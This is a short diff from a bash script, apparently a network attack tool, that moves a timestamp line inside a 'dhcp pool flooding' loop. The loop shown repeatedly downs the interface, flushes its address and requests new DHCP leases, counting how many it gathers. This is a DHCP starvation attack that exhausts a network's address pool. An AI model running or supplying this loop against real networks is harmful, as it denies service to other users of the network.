@@ -186,7 +186,6 @@ if [ $ask -eq 5 ]
 		#start dhcp pool flooding
 		while [ $online -eq 1 ]
 			do
-				date=$(date)
 				echo "attack is running, this will take a while.."
 				sudo ifconfig $inter down && sleep 2
 				sudo ip addr flush dev $inter
@@ -196,6 +195,7 @@ if [ $ask -eq 5 ]
 				sudo dhclient $inter
 				((cnt++))
 				clear
+				date=$(date)
 				echo $cnt "DHCP leases gathered" $date
 				sleep 2
 				#check online start 
